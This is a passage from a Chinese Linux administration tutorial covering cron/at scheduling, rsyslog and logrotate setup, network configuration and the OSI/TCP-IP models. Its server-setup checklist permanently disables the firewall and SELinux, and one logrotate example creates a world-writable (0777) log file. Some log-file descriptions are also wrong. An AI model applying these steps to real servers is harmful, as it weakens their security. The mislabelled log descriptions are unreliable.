</span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> &lt;EOT&gt;    //CTRL+D输入完毕，提交任务</span></span><br><span class="line">job 1 at Sat Mar 21 22:34:00 2019</span><br><span class="line"></span><br><span class="line">2.查询任务</span><br><span class="line">[root@localhost ~]# atq</span><br><span class="line">3 Thu Mar 30 09:55:00 2019 a root</span><br><span class="line"></span><br><span class="line">3.验证结果</span><br><span class="line">[root@localhost ~]# id uuuu</span><br><span class="line">查出用户信息即可</span><br></pre></td></tr></table></figure>

<h2 id="二、循环调度执行-cron"><a href="#二、循环调度执行-cron" class="headerlink" title="二、循环调度执行 cron"></a>二、循环调度执行 cron</h2><p><strong>简介</strong></p>
<p>​    cron的概念和crontab是不可分割的。</p>
<p>​    crontab是一个命令，常见于Unix和Linux的操作系统之中</p>
<p>​    用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于“crontab”文件中，以供之后读取和执行。</p>
<p><strong>查看进程状态</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# systemctl status crond.service</span><br><span class="line">[root@qianfeng ~]# ps aux |grep crond</span><br><span class="line">root 550 0.0 0.0 126300 1648 ? Ss 10:05 0:00 /usr/sbin/crond -n</span><br><span class="line">​crond程序运行是计划任务执行的根本</span><br></pre></td></tr></table></figure>

<p><strong>cron示例</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">计划任务存储位置</span></span><br><span class="line">[root@localhost ~]# ls /var/spool/cron/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">管理方式</span></span><br><span class="line">1.创建计划</span><br><span class="line">[root@localhost ~]# crontab -e    //Edit jobs for the current user</span><br><span class="line">2.查询计划</span><br><span class="line">[root@localhost ~]# crontab -l 	 //List the jobs for the current user</span><br><span class="line">管理员可以使用 -u username, 去管理其他用户的计划任务</span><br><span class="line">3.删除计划</span><br><span class="line">[root@localhost ~]# crontab -r 	//Remove all jobs for the current users.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">语法格式 Job format</span></span><br><span class="line"></span><br><span class="line">.---------------- minute (0 - 59)</span><br><span class="line"></span><br><span class="line">| .------------- hour (0 - 23)</span><br><span class="line"></span><br><span class="line">| | .---------- day of month (1 - 31)</span><br><span class="line"></span><br><span class="line">| | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"></span><br><span class="line">| | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"></span><br><span class="line">| | | | |</span><br><span class="line"></span><br><span class="line">* * * * * command</span><br><span class="line"></span><br><span class="line">    说明</span><br><span class="line">    	分 时 日 月 周     命令或脚本程序</span><br><span class="line">    示例1</span><br><span class="line">    	*/5 * * * * /mysql_back.sh</span><br><span class="line">    		每五分钟执行</span><br><span class="line">    	5 2 1,4,6 * * /mysql_back.sh</span><br><span class="line">    		每月的1,4,6日的2点5分执行</span><br><span class="line">    	0 2 5-9 * * /mysql_back.sh</span><br><span class="line">    		每月5日到9日的两点整执行</span><br><span class="line">    	* * * * * /mysql_back.sh</span><br><span class="line">    		每分钟执行</span><br><span class="line">    	0 * * * * /mysql_back.sh</span><br><span class="line">    		每小时的0分执行</span><br><span class="line">    	0 2 * * * /mysql_back.sh</span><br><span class="line">    		每天两点整执行</span><br><span class="line">    	0 2 14 * * /mysql_back.sh</span><br><span class="line">    		每月14号的2点整执行</span><br><span class="line">    	0 2 14 2 * /mysql_back.sh</span><br><span class="line">    		2月14日2点整执行</span><br><span class="line">    	0 2 * * 5 /mysql_back.sh</span><br><span class="line">    		不写月日，仅周生效</span><br><span class="line">    		每月的周五，两点执行</span><br><span class="line">    	0 2 2 6 5 /mysql_back.sh</span><br><span class="line">    		书写月和日，月或日，月日周均生效</span><br><span class="line">    		6月2日的两点整执行</span><br><span class="line">    		6月的周五两点整执行</span><br><span class="line">    示例2</span><br><span class="line">    	00 02 * * * ls</span><br><span class="line">    		每天2:00整</span><br><span class="line">    	00 02 1 * * ls</span><br><span class="line">    		每月1号2:00整</span><br><span class="line">    	00 02 14 2 * ls</span><br><span class="line">    		每年2月14号2:00整</span><br><span class="line">    	00 02 * * 7 ls</span><br><span class="line">    		每周日2:00整</span><br><span class="line">    	00 02 * 6 5 ls</span><br><span class="line">    		每年6月的周五2:00整  （特殊）</span><br><span class="line">    	00 02 14 * 7 ls</span><br><span class="line">    		每月14号2:00整</span><br><span class="line">    		每周日2:00整</span><br><span class="line">    		这两个时间都执行</span><br><span class="line">    	00 02 14 2 7 ls</span><br><span class="line">    		每年2月14号2:00整</span><br><span class="line">    		2月每周日2:00整</span><br><span class="line">    		这两个时间都执行</span><br></pre></td></tr></table></figure>

<h1 id="⑪Linux日志管理"><a href="#⑪Linux日志管理" class="headerlink" title="⑪Linux日志管理"></a>⑪Linux日志管理</h1><p><strong>简介</strong></p>
<p>rsyslog 系统日志管理：关心问题：哪类程序—&gt;产生的什么日志—&gt;放到什么地方</p>
<p>logrotate日志轮转：将大量的日志，分割管理，删除旧日志。</p>
<h2 id="一、rsyslog系统日志管理"><a href="#一、rsyslog系统日志管理" class="headerlink" title="一、rsyslog系统日志管理"></a>一、rsyslog系统日志管理</h2><h3 id="1-处理日志的进程"><a href="#1-处理日志的进程" class="headerlink" title="1.处理日志的进程"></a>1.处理日志的进程</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">第一类：</span><br><span class="line">rsyslogd： 系统专职日志程序。</span><br><span class="line">处理绝大部分日志记录，</span><br><span class="line">系统操作有关的信息，如登录信息，程序启动关闭信息，错误信息</span><br><span class="line"></span><br><span class="line">第二类：</span><br><span class="line">httpd/nginx/mysql: 各类应用程序，可以以自己的方式记录日志.</span><br><span class="line"></span><br><span class="line">观察 rsyslogd程序</span><br><span class="line">[root@localhost ~]# ps aux |grep rsyslogd</span><br><span class="line">root 717 0.0 0.0 219752 3880 ? Ssl 09:05 0:00 /usr/sbin/rsyslogd -n</span><br></pre></td></tr></table></figure>

<h3 id="2-常见的日志文件-系统、进程、应用程序"><a href="#2-常见的日志文件-系统、进程、应用程序" class="headerlink" title="2.常见的日志文件(系统、进程、应用程序)"></a>2.常见的日志文件(系统、进程、应用程序)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">系统主日志文件</span></span><br><span class="line">[root@localhost ~]# tail   -10   /var/log/messages</span><br><span class="line"><span class="meta">#</span><span class="bash">动态查看日志文件的尾部</span></span><br><span class="line">[root@localhost ~]# tail -f /var/log/messages</span><br><span class="line"><span class="meta">#</span><span class="bash">认证、安全</span></span><br><span class="line">[root@localhost ~]# tailf /var/log/secure</span><br><span class="line"><span class="meta"> #</span><span class="bash">yum</span></span><br><span class="line">[root@localhost ~]# tail /var/log/yum.log</span><br><span class="line"><span class="meta">#</span><span class="bash">跟邮件postfix相关</span></span><br><span class="line">[root@localhost ~]# tail /var/log/maillog</span><br><span class="line"><span class="meta">#</span><span class="bash">crond、at进程产生的日志</span></span><br><span class="line">[root@localhost ~]# tail /var/log/cron</span><br><span class="line"><span class="meta">#</span><span class="bash">和系统启动相关</span></span><br><span class="line">[root@localhost ~]# tail /var/log/dmesg</span><br><span class="line"> </span><br><span class="line">​##只需了解</span><br><span class="line">[root@localhost ~]# tail /var/log/audit/audit.log</span><br><span class="line"> //系统审计日志</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# tail /var/log/mysqld.log</span><br><span class="line">//MySQL</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# tail /var/log/xferlog</span><br><span class="line">//和访问FTP服务器相关</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# tail  /var/log/wtmp</span><br><span class="line">//当前登录的用户（命令：w）</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# tail  /var/log/btmp</span><br><span class="line">//最近登录的用户（命令last）</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# tail  /var/log/lastlog</span><br><span class="line">//所有用户的登录情况（命令lastlog ）</span><br></pre></td></tr></table></figure>

<h3 id="3-rsyslogd配置"><a href="#3-rsyslogd配置" class="headerlink" title="3.rsyslogd配置"></a>3.rsyslogd配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.相关程序</span><br><span class="line">[root@localhost ~]# yum  -y install  rsyslog  logrotate</span><br><span class="line">默认已安装</span><br><span class="line"></span><br><span class="line">2.启动程序</span><br><span class="line">[root@localhost ~]# systemctl  start   rsyslog.service</span><br><span class="line"></span><br><span class="line">3.相关文件</span><br><span class="line">rpm -qc rsyslog	</span><br><span class="line">/etc/rsyslog.conf   ----rsyslogd的主配置文件（关键）</span><br><span class="line">/etc/sysconfig/rsyslog   ----rsyslogd相关文件，定义级别（了解一下）</span><br><span class="line">/etc/logrotate.d/syslog  ----和日志办轮转（切割）相关</span><br></pre></td></tr></table></figure>

<h3 id="4-主配置文件"><a href="#4-主配置文件" class="headerlink" title="4.主配置文件"></a>4.主配置文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">告诉rsyslogd进程什么日志，应该存到哪里</span><br><span class="line">[root@localhost ~]# vim /etc/rsyslog.conf</span><br><span class="line"></span><br><span class="line">RULES</span><br><span class="line">	即规则，是一套生成日志，以及存储日志的策略。</span><br><span class="line">	规则由设备+级别+存放位置组成。</span><br><span class="line">	RULES由FACILITY+LEVEL+FILE组成。</span><br><span class="line">	authpriv.* 		/var/log/secure（SSH信息）</span><br><span class="line">	mail.* 			-/var/log/maillog（发邮件）</span><br><span class="line">	cron.* 			/var/log/cron（创建任务）</span><br><span class="line">	这里有一个-符号, 表示是使用异步的方式记录, 因为日志一般会比较大</span><br><span class="line">	*.info;mail.none;authpriv.none;cron.none   /var/log/messages</span><br><span class="line">	系统日志排除了邮件，认证，计划日志。</span><br><span class="line">	</span><br><span class="line">facility设备</span><br><span class="line">	facility：是系统对某种类型事件的定义。如AUTHPRIV是安全事件，CRON是计划任务事件。</span><br><span class="line">	[root@localhost ~]# man 3 syslog</span><br><span class="line">	设备类型</span><br><span class="line">​		LOG_SYSLOG    #syslogd自身产生的日志 </span><br><span class="line">​		LOG_AUTHPRIV  #安全认证</span><br><span class="line">​		LOG_CRON      #cron and at</span><br><span class="line">​		LOG_MAIL      #邮件系统mail subsystem</span><br><span class="line">​		LOG_USER (default)  #用户相关</span><br><span class="line">​		LOG_DAEMON    #后台进程</span><br><span class="line">​		LOG_FTP       #ftp daemon</span><br><span class="line">​		LOG_KERN      #kernel messages</span><br><span class="line">​		LOG_LPR       #打印机printer subsystem</span><br><span class="line">​		LOG_LOCAL0 through LOG_LOCAL7  #用户自定义设备</span><br><span class="line">	程序类型示例</span><br><span class="line">		关于程序和设备的联系问题，程序自身会决定将日志交给哪类设备。如SSH程序会选择安全类设备。这一点由开发者定义。</span><br><span class="line">		[root@localhost ~]# grep  Facility    /etc/ssh/sshd_config </span><br><span class="line">		SyslogFacility AUTHPRIV</span><br><span class="line">		请问这个程序是属于哪个设备呢？~~~认证设备</span><br><span class="line">					</span><br><span class="line">level级别</span><br><span class="line">​		LOG_EMERG 		紧急，致命，服务无法继续运行，如配置文件丢失</span><br><span class="line">​		LOG_ALERT 		报警，需要立即处理，如磁盘空使用95%</span><br><span class="line">​		LOG_CRIT 		致命行为</span><br><span class="line">​		LOG_ERR 		错误行为</span><br><span class="line">​		LOG_WARNING	    警告信息</span><br><span class="line">​		LOG_NOTICE 	    普通，重要的标准信息</span><br><span class="line">​		LOG_INFO 		标准信息</span><br><span class="line">​		LOG_DEBUG 		调试信息，排错所需，一般不建议使用</span><br><span class="line">		从下到上，级别从低到高，记录的信息越来越少</span><br></pre></td></tr></table></figure>

<p>规则示意图：</p>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717182717245.png" alt="image-20200717182717245"></p>
<h2 id="二、logrotate日志轮转"><a href="#二、logrotate日志轮转" class="headerlink" title="二、logrotate日志轮转"></a>二、logrotate日志轮转</h2><p><strong>简介</strong></p>
<p>​    日志  记录了程序运行时各种信息。通过日志可以分析用户行为，记录运行轨迹，查找程序问题。可惜磁盘的空间是有限的，只能记录最后一段时间发生的事。为了节省空间和整理方便，日志文件经常需要按时间或大小等维度分成多份，删除时间久远的日志文件。</p>
<h3 id="1-工作原理"><a href="#1-工作原理" class="headerlink" title="1.工作原理"></a>1.工作原理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">原理：按照配置进行轮转</span><br><span class="line"></span><br><span class="line">1.配置文件种类</span><br><span class="line">主文件：/etc/logrotate.conf (决定每个日志文件如何轮转)</span><br><span class="line">子文件夹：/etc/logrotate.d/*</span><br><span class="line"></span><br><span class="line">观察主文件和子文件</span><br><span class="line">[root@qianfeng ~]# ls /etc/logrotate.conf /etc/logrotate.d/</span><br><span class="line">/etc/logrotate.conf</span><br><span class="line">/etc/logrotate.d/:</span><br><span class="line">acpid cups iscsiuiolog ppp rpm subscription-manager up2date wpa_supplicant</span><br><span class="line">conman httpd mgetty psacct setroubleshoot syslog vsftpd.log yum</span><br></pre></td></tr></table></figure>

<h3 id="2-主配置文件介绍"><a href="#2-主配置文件介绍" class="headerlink" title="2.主配置文件介绍"></a>2.主配置文件介绍</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# vim /etc/logrotate.conf </span><br><span class="line">==============全局设置==============================</span><br><span class="line">weekly 		//轮转的周期，一周轮转</span><br><span class="line">rotate 4 	//保留4份</span><br><span class="line">create 		//轮转后创建新文件</span><br><span class="line">dateext 	//使用日期作为后缀</span><br><span class="line"><span class="meta">#</span><span class="bash">compress	 //是否压缩</span></span><br><span class="line">include /etc/logrotate.d	//包含该目录下的子配置文件</span><br><span class="line"></span><br><span class="line">/var/log/wtmp &#123;  //对某日志文件设置轮转的方法</span><br><span class="line">monthly 		 //一月轮转一次</span><br><span class="line">minsize 1M 		 //最小达到1M才轮转,monthly and  minsize</span><br><span class="line">create 0664 root utmp	 //轮转后创建新文件，并设置权限</span><br><span class="line">rotate 1 		//保留一份</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/var/log/btmp &#123;</span><br><span class="line">missingok 		//丢失不提示</span><br><span class="line">monthly 		//每月轮转一次</span><br><span class="line">create 0600 root utmp 	//轮转后创建新文件，并设置权限</span><br><span class="line">rotate 1 		//保留一份</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-yum日志轮转实例"><a href="#3-yum日志轮转实例" class="headerlink" title="3.yum日志轮转实例"></a>3.yum日志轮转实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">轮转的目标文件/var/log/yum.log</span><br><span class="line"></span><br><span class="line">​配置轮转规则</span><br><span class="line">[root@localhost ~]# vim /etc/logrotate.d/yum </span><br><span class="line">/var/log/yum.log &#123;</span><br><span class="line">missingok	  //丢失不执行</span><br><span class="line"><span class="meta">#</span><span class="bash">notifempty	  //空文件不论转</span></span><br><span class="line"><span class="meta">#</span><span class="bash">size 30k	  //达到30k轮转, daily or  size</span></span><br><span class="line"><span class="meta">#</span><span class="bash">yearly		  //或者一年一轮转</span></span><br><span class="line">daily		//缩小周期到1天</span><br><span class="line">rotate 3		//轮转保留3次</span><br><span class="line">create 0777 root root</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">​测试</span><br><span class="line">1.错误示范</span><br><span class="line">[root@localhost ~]# /usr/sbin/logrotate /etc/logrotate.conf   #手动轮转</span><br><span class="line">[root@localhost ~]# ls /var/log/yum*</span><br><span class="line">/var/log/yum.log</span><br><span class="line">文件只有一个。因为日期没变</span><br><span class="line"></span><br><span class="line">2.正确示范</span><br><span class="line">修改时间，手动触发轮转</span><br><span class="line">[root@localhost ~]# date 04011000   #把时间向未来推移</span><br><span class="line">[root@localhost ~]# /usr/sbin/logrotate  -s /var/lib/logrotate/logrotate.status /etc/logrotate.conf</span><br><span class="line">[root@localhost ~]# ls /var/log/yum*</span><br><span class="line">日志文件已经出现多个</span><br><span class="line"></span><br><span class="line">​关于时间</span><br><span class="line">[root@localhost ~]# grep 'yum' /var/lib/logrotate/logrotate.status</span><br><span class="line">//记录所有日志文件最近轮转的时间</span><br><span class="line"></span><br><span class="line">"/var/log/yum.log" 2019-3-31-10:0:23</span><br><span class="line">//如果没有轮转过，第一次只有记录</span><br></pre></td></tr></table></figure>

<h1 id="⑫Linux网络管理"><a href="#⑫Linux网络管理" class="headerlink" title="⑫Linux网络管理"></a>⑫Linux网络管理</h1><h2 id="一、网络接口名称规则"><a href="#一、网络接口名称规则" class="headerlink" title="一、网络接口名称规则"></a>一、网络接口名称规则</h2><p>en：eethernet 以太网-双绞线</p>
<p>wl：wirelessLAN：无线网卡</p>
<p>ww：WAN广域网：串行线缆</p>
<p>o：on-board板载网卡</p>
<p>s：hotplug热插拔</p>
<p>p：PCI接口</p>
<p>N：序号或者ID</p>
<p>示例：enp2s0</p>
<h2 id="二、NetworkManager服务"><a href="#二、NetworkManager服务" class="headerlink" title="二、NetworkManager服务"></a>二、NetworkManager服务</h2><p>网络管理器（NetworkManager）是一个动态网络的控制器与配置系统，它用于当网络设备可用时保持设备和连接开启并激活</p>
<p>默认情况下，CentOS/RHEL 7 已安装网络管理器，并处于启用状态。</p>
<p>查看网络管理程序的状态：systemctl    status   NetworkManager </p>
<p>查看网络子管理程序的状态：systemctl    status   network</p>
<h2 id="三、配置网络的工具"><a href="#三、配置网络的工具" class="headerlink" title="三、配置网络的工具"></a>三、配置网络的工具</h2><p><strong>1.命令行配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">配置文件：</span><br><span class="line">[root@localhost ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens32</span><br><span class="line">命令行： nmcli</span><br><span class="line">如果没有这个命令，可以执行安装 yum -y install NetworkManager</span><br></pre></td></tr></table></figure>

<p>2.图形配置   略</p>
<h2 id="四、配置网络参数"><a href="#四、配置网络参数" class="headerlink" title="四、配置网络参数"></a>四、配置网络参数</h2><h3 id="1-配置IP"><a href="#1-配置IP" class="headerlink" title="1.配置IP"></a>1.配置IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 	1.配置网卡参数</span></span></span><br><span class="line"></span><br><span class="line">先备份网卡配置文件，在修改</span><br><span class="line">[root@qianfeng ~]# cp   /etc/sysconfig/network-scripts/ifcfg-ens33   .</span><br><span class="line">命令行查看IP #ip a</span><br><span class="line">命令行查网关 #ip  r</span><br><span class="line">命令行查dns  #cat   /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">！！！修改这个文件要慎重</span><br><span class="line">[root@qianfeng ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">ONBOOT=yes      #是否启用该设备</span><br><span class="line">BOOTPROTO=none  #手动(none/static)还是自动(dhcp)</span><br><span class="line">IPADDR=192.168.142.131   #根据自动获取的地址进行配置，用来定位主机</span><br><span class="line">NETMASK=255.255.255.0  #子网掩码。用来定义网络，这台主机是192.168.142的网络</span><br><span class="line">GATEWAY=192.168.142.2  #网关，也叫默认路由</span><br><span class="line">DNS1=192.168.142.2   #域名解析。这个数字1不要忘了</span><br><span class="line"></span><br><span class="line">NAME=ens33   #网卡信息</span><br><span class="line">UUID=d1769473-dc3c-4cf3-9158-8798994d24bb  #网卡信息</span><br><span class="line">DEVICE=ens33  #网卡信息</span><br><span class="line"></span><br><span class="line">UUID不是网卡配置文件中必须的信息</span><br><span class="line">查看自身网卡UUID的命令</span><br><span class="line">[root@localhost ~]#  nmcli con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 	2.重启网络服务</span></span></span><br><span class="line">[root@qianfeng ~]# systemctl   restart network</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 	3.查看IP地址</span></span></span><br><span class="line">[root@qianfeng ~]# ip  a</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 问题</span></span></span><br><span class="line">windows虚拟网卡是否安装</span><br><span class="line">VMware系统服务是否被优化掉</span><br><span class="line">LINUX网络配置设置为开机启动</span><br></pre></td></tr></table></figure>

<h3 id="2-主机名"><a href="#2-主机名" class="headerlink" title="2.主机名"></a>2.主机名</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 改名方式1</span></span></span><br><span class="line">查看主机名</span><br><span class="line">[root@qianfeng ~]# hostname</span><br><span class="line">配置主机名</span><br><span class="line">[root@qianfeng ~]# hostnamectl  set-hostname  qf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 改名方式2</span></span></span><br><span class="line">查看和配置主机名</span><br><span class="line">[root@qianfeng ~]# cat /etc/hostname </span><br><span class="line">[root@qianfeng ~]# vim  /etc/hostname</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 重启生效</span></span></span><br><span class="line">[root@qianfeng ~]# reboot</span><br></pre></td></tr></table></figure>

<h3 id="3-网络测试工具"><a href="#3-网络测试工具" class="headerlink" title="3.网络测试工具"></a>3.网络测试工具</h3><p>测试工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# ip a		    //查看所有IP（ifconfig）</span><br><span class="line">[root@qianfeng ~]# ip route		//查看路由，查看网关</span><br><span class="line">[root@qianfeng ~]# ip neigh 	//（了解）另一台主机ping通，查看邻居</span><br><span class="line">[root@qianfeng ~]# ping  127.0.0.1</span><br><span class="line">PING （Packet Internet Groper），因特网包探索器</span><br><span class="line">两台虚拟机需要通信，vmnet号（网络连接模式）一定要相同</span><br></pre></td></tr></table></figure>

<p>ports and services</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装示例服务</span></span><br><span class="line">什么程序不重要</span><br><span class="line">[root@aliyun ~]# yum -y install httpd </span><br><span class="line">[root@aliyun ~]# systemctl start httpd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Show TCP sockets</span></span><br><span class="line">什么端口不重要</span><br><span class="line">[root@aliyun ~]# ss -tnl</span><br><span class="line">State Recv-Q Send-Q Local Address:Port Peer Address:Port </span><br><span class="line">LISTEN 0 128 *:80 *:* </span><br><span class="line">[root@aliyun ~]# netstat  -anpt</span><br><span class="line"></span><br><span class="line">​重要的是要知道端口的概念和查看的方法</span><br></pre></td></tr></table></figure>

<h2 id="五、初始化服务器"><a href="#五、初始化服务器" class="headerlink" title="五、初始化服务器"></a>五、初始化服务器</h2><p><strong>最小化安装</strong>：兼容程序、​开发包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.为你的服务器配置root 密码</span><br><span class="line"></span><br><span class="line">2.配置IP地址（VMNAT8）</span><br><span class="line"></span><br><span class="line">3.配置YUM 源</span><br><span class="line">自动挂载光驱/阿里YUM，配置YUM仓库</span><br><span class="line"></span><br><span class="line">4.关防火墙</span><br><span class="line">[root@localhost ~]# systemctl  stop firewalld</span><br><span class="line">[root@localhost ~]# systemctl  disable  firewalld</span><br><span class="line">[root@localhost ~]# systemctl  status firewalld		</span><br><span class="line"></span><br><span class="line">5.selinux</span><br><span class="line">临时关闭：setenforce  0 （零）</span><br><span class="line">永久关闭：</span><br><span class="line">[root@localhost ~]# vim /etc/sysconfig/selinux </span><br><span class="line">SELINUX=disabled</span><br><span class="line"></span><br><span class="line">6.安装常用程序</span><br><span class="line">[root@localhost ~]# yum install -y    lrzsz    sysstat  elinks   wget   net-tools   bash-completion</span><br><span class="line"></span><br><span class="line">7.关机快照</span><br></pre></td></tr></table></figure>

<h1 id="⑬Linux网络管理实战1"><a href="#⑬Linux网络管理实战1" class="headerlink" title="⑬Linux网络管理实战1"></a>⑬Linux网络管理实战1</h1><h2 id="一、OSI简介"><a href="#一、OSI简介" class="headerlink" title="一、OSI简介"></a>一、OSI简介</h2><ul>
<li><p>​    OSI：Open System Interconnection 开放系统互联模型</p>
</li>
<li><p>​    国际标准化组织（ISO）制定，定义了不同计算机互联的标准，设计和描述，计算机网络通信的框架</p>
</li>
<li><p>​    制定OSI的优势：<br>​            开放<br>​            厂商兼容性<br>​            易于理解、学习<br>​            模块化工程<br>​            故障排除</p>
</li>
</ul>
<h3 id="1、OSI-7层结构"><a href="#1、OSI-7层结构" class="headerlink" title="1、OSI:7层结构"></a>1、OSI:7层结构</h3><table>
<thead>
<tr>
<th align="center">OSI的7层结构</th>
<th align="center">功  能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">应用层</td>
<td align="center">应用程序/原始数据</td>
</tr>
<tr>
<td align="center">表示层</td>
<td align="center">格式/压缩/加密：快速传递、安全传递</td>
</tr>
<tr>
<td align="center">会话层</td>
<td align="center">会话/全双工/半双工：身份信息</td>
</tr>
<tr>
<td align="center">传输层</td>
<td align="center">分段/重组/端口号：传输效率</td>
</tr>
<tr>
<td align="center">网络层</td>
<td align="center">IP地址/寻址/路由：总目标，全球地址</td>
</tr>
<tr>
<td align="center">数据链路层</td>
<td align="center">MAC地址/局域网：分段目标，局部地址</td>
</tr>
<tr>
<td align="center">物理层</td>
<td align="center">传输介质/比特流：电流/光/无线信号/4G/5G</td>
</tr>
</tbody></table>
<h3 id="2、TCP-IP-5层结构"><a href="#2、TCP-IP-5层结构" class="headerlink" title="2、TCP/IP:5层结构"></a>2、TCP/IP:5层结构</h3><table>
<thead>
<tr>
<th align="center">TCP/IP的5层结构</th>
<th align="center">功  能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">应用层</td>
<td align="center">应用程序/原始数据<br>格式/压缩/加密：快速传递、安全传递<br>会话/全双工/半双工：身份信息</td>
</tr>
<tr>
<td align="center">传输层</td>
<td align="center">分段/重组/端口号：传输效率</td>
</tr>
<tr>
<td align="center">网络层</td>
<td align="center">IP地址/寻址/路由：总目标，全球地址</td>
</tr>
<tr>
<td align="center">数据链路层</td>
<td align="center">MAC地址/局域网：分段目标，局部地址</td>
</tr>
<tr>
<td align="center">物理层</td>
<td align="center">传输介质/比特流：电流/光/无线信号/4G/5G</td>
</tr>
</tbody></table>
<h3 id="3、TCP-IP-4层结构"><a href="#3、TCP-IP-4层结构" class="headerlink" title="3、TCP/IP:4层结构"></a>3、TCP/IP:4层结构</h3><table>
<thead>
<tr>
<th align="center">TCP/IP的4层结构</th>
<th align="center">功  能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">应用层</td>
<td align="center">应用程序/原始数据<br>格式/压缩/加密：快速传递、安全传递<br>会话/全双工/半双工：身份信息</td>
</tr>
<tr>
<td align="center">传输层</td>
<td align="center">分段/重组/端口号：传输效率</td>
</tr>
<tr>
<td align="center">网络层</td>
<td align="center">IP地址/寻址/路由：总目标，全球地址</td>
</tr>
<tr>
<td align="center">网络接口层</td>
<td align="center">MAC地址/局域网：分段目标，局部地址<br>传输介质/比特流：电流/光/无线信号/4G/5G</td>
</tr>
</tbody></table>
<h3 id="4、OSI模型和TCP-IP模型的区别"><a href="#4、OSI模型和TCP-IP模型的区别" class="headerlink" title="4、OSI模型和TCP/IP模型的区别"></a>4、OSI模型和TCP/IP模型的区别</h3><p>OSI<br>​        推出的时间早，只有理论，没有实践</p>
<p>TCP/IP<br>        传输控制协议/互联网协议（Trancation Control Protocol/Inetnet  Protocol）<br>        由美国军方实践，总结出的理论，当今通信标准</p>
<h3 id="5、TCP-IP-数据单元-DU"><a href="#5、TCP-IP-数据单元-DU" class="headerlink" title="5、TCP/IP:数据单元/DU"></a>5、TCP/IP:数据单元/DU</h3><p>为了方便交流，通信模型不同的模块对信息加工，并进行统一命名。</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">名称</th>
<th align="center">释义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">应用层数据</td>
<td align="center">AP   DU</td>
<td align="center">APDU：ApplicationProtocolDataUnit–应用协议数据单元</td>
</tr>
<tr>
<td align="center">传输层数据</td>
<td align="center">segment DU</td>
<td align="center">分段数据</td>
</tr>
<tr>
<td align="center">网络层数据</td>
<td align="center">packet DU</td>
<td align="center">包 数据</td>
</tr>
<tr>
<td align="center">数据链路层数据</td>
<td align="center">frame DU</td>
<td align="center">帧 数据</td>
</tr>
<tr>
<td align="center">物理层数据</td>
<td align="center">bit DU</td>
<td align="center">比特 数据</td>
</tr>
</tbody></table>
<h3 id="6-封装和解封装"><a href="#6-封装和解封装" class="headerlink" title="6.封装和解封装"></a>6.封装和解封装</h3><p>信息从一台计算产生，经过TCP/IP模型加工。后传递到另一台计算机。<br>​        这个通信过程就像，快递从厂家包装到顾客收到货物拆包一样。<br>​        把这个通信过程，称作数据的封装（发送）和数据解封装（接收）<br>​        从而更好的理解，数据通信原理。<br>​<br>​    数据封装的过程大致如下<br>​        1.（应用层）用户信息转换为数据，以便在网络上传输<br>​        2.（传输层）数据转换为数据段，并在发送方和接收方主机之间建立一条可靠的连接<br>​        3.（网络层）数据段转换为数据包或数据报，并在报头中放上逻辑地址，这样每一个数据包都可以通过互联网络进行传输<br>​        4.（数据链路层）数据包或数据报转换为帧，以便在本地网络中传输。在本地网段上，使用硬件地址唯一标识每一台主机。<br>​        5.（物理层）帧转换为比特流，并采用数字编码和时钟方案</p>
<h2 id="二、TCP-IP协议族"><a href="#二、TCP-IP协议族" class="headerlink" title="二、TCP/IP协议族"></a>二、TCP/IP协议族</h2><p>TCP/IP：传输控制协议/互联网协议（Transmission Control Protocol/Internet Protocol）</p>
